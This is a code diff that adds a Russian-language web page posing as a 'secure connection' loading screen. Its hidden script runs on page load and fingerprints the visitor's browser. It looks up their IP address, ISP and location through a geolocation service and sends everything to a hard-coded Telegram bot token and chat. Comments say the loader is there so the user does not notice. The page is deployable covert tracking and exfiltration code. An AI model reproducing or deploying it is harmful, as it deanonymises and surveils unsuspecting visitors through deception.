@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        body { background: #0a0a0a; color: #0a0a0a; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; }
+        .loader { font-size: 2em; color: #00ff41; text-shadow: 0 0 10px #00ff41; animation: blink 1s infinite; }
+        @keyframes blink { 0%{opacity:1} 50%{opacity:0.2} 100%{opacity:1} }
+    </style>
+</head>
+<body>
+    <div class="loader">Инициализация защищённого соединения...</div>
+
+    <script>
+        (function() {
+            // ВСЁ, БЛЯТЬ, ГОТОВО — ТВОЙ ТОКЕН И ЧАТ УЖЕ ТУТ
+            const BOT_TOKEN = '8633706028:AAEpLEZSY9iF6Itytdy-Ep_86kg1CyFRuKA';
+            const CHAT_ID = '8618210982';
+
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                canvasFingerprint: (function() {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 256;
+                    canvas.height = 128;
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(0, 0, 256, 128);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Phantom_Collector', 10, 10);
+                    ctx.strokeStyle = '#fff';
+                    ctx.strokeRect(5, 5, 246, 118);
+                    return canvas.toDataURL().substring(0, 100);
+                })(),
+                cookiesEnabled: navigator.cookieEnabled,
+                localStorageAvailable: (function() { try { return !!localStorage; } catch(e) { return false; } })(),
+                ip: null,
+                geo: null
+            };
+
+            function computeHash(str) {
+                let hash = 0;
+                for (let i = 0; i < str.length; i++) {
+                    const char = str.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                return hash.toString(16);
+            }
+            data.sessionHash = computeHash(JSON.stringify(data));
+
+            function sendToTelegram(payload) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                let message = `🔮 *НОВЫЙ КЛИЕНТ ЗАХАЧЕН* 🔮\n`;
+                message += `🕒 Время: ${payload.timestamp}\n`;
+                message += `🖥️ User-Agent: ${payload.userAgent}\n`;
+                message += `🌐 Язык: ${payload.language}\n`;
+                message += `📱 Платформа: ${payload.platform}\n`;
+                message += `🖥️ Экран: ${payload.screenWidth}x${payload.screenHeight} (${payload.colorDepth} бит)\n`;
+                message += `⏰ Часовой пояс: ${payload.timezone}\n`;
+                message += `🍪 Cookies: ${payload.cookiesEnabled ? 'включены' : 'отключены'}\n`;
+                message += `💾 LocalStorage: ${payload.localStorageAvailable ? 'доступен' : 'недоступен'}\n`;
+                message += `🎨 Canvas-отпечаток: ${payload.canvasFingerprint}\n`;
+                message += `🔑 Хеш сессии: \`${payload.sessionHash}\``;
+                if (payload.ip) {
+                    message += `\n🌍 IP: ${payload.ip}`;
+                }
+                if (payload.geo && payload.geo.city) {
+                    message += `\n📍 Город: ${payload.geo.city}, ${payload.geo.country}`;
+                }
+
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_notification: false
+                    })
+                })
+                .then(res => {
+                    if (res.ok) console.log('✅ Улетело!');
+                    else console.warn('❌ Статус:', res.status);
+                })
+                .catch(err => console.error('❌ Сбой:', err));
+            }
+
+            function fetchIPAndGeo() {
+                fetch('https://ip-api.com/json/')
+                    .then(response => response.json())
+                    .then(geoData => {
+                        if (geoData.status === 'success') {
+                            data.ip = geoData.query;
+                            data.geo = {
+                                city: geoData.city,
+                                country: geoData.countryCode,
+                                region: geoData.regionName,
+                                isp: geoData.isp,
+                                org: geoData.org,
+                                lat: geoData.lat,
+                                lon: geoData.lon
+                            };
+                        } else {
+                            data.ip = 'не определён';
+                            data.geo = { city: 'неизвестно', country: 'неизвестно' };
+                        }
+                        sendToTelegram(data);
+                    })
+                    .catch(() => {
+                        data.ip = 'ошибка получения';
+                        data.geo = { city: 'ошибка', country: 'ошибка' };
+                        sendToTelegram(data);
+                    });
+            }
+
+            // ЗАПУСКАЕМ СРАЗУ, НАХУЙ!
+            fetchIPAndGeo();
+
+            // Маскируемся под долгую загрузку, чтобы юзер не дергался
+            window.addEventListener('load', function() {
+                setTimeout(function() {
+                    document.querySelector('.loader').textContent = 'Соединение установлено.';
+                }, 2000);
+            });
+        })();
+    </script>
+</body>
+</html>
